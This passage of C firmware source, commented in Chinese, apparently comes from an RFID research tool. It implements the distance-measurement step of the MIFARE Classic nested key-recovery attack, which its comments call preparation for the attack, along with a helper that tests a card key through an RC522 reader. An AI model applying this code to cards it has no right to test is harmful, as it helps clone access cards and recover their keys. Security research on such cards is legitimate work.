* @brief 	: Nested 距离探测实现
* @param 	:block 	 : 卡片的已知秘钥的所属扇区
* @param 	:type 	 : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
* @param 	:key 	 : 卡片的已知秘钥的U64值
* @param 	:nd 	 : 随机数距离的探测结果
* @retval	: 操作状态值
*
*/
uint8_t Nested_Distacne_Detect(uint8_t block, uint8_t type, uint8_t *key, NestedDist *nd) {
	uint8_t status		= HF_TAG_OK;
	uint32_t distance 	= 0;
	// 必须要确保场内有卡
	status = pcd_14a_reader_scan_auto(p_tag_info);
	if (status != HF_TAG_OK) {
        return status;
    } else {
        // 至少卡片是存在的，可以先复制UID到缓冲区
        get_4byte_tag_uid(p_tag_info, nd->uid);
    }
	// 获取距离，为接下来的攻击做准备
	status = Measure_Distance(
		bytes_to_num(key, 6),
		block,
		type,
		&distance
	);
    // 一切正常，我们需要将距离值放入结果中
	if (status == HF_TAG_OK) {
		num_to_bytes(distance, 4, nd->distance);
	}
	return status;
}

/**
* @brief 	: 使用基于RC522的M1算法模块去验证密钥
* @retval	: 验证结果
*
*/
uint8_t auth_key_use_522_hw(uint8_t block, uint8_t type, uint8_t* key) {
	// 每次验证一个block都要重新寻卡
	if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
		return HF_TAG_NO;
	}
	// 寻到卡后我们开始验证！
	return pcd_14a_reader_mf1_auth(p_tag_info, type, block, key);
}
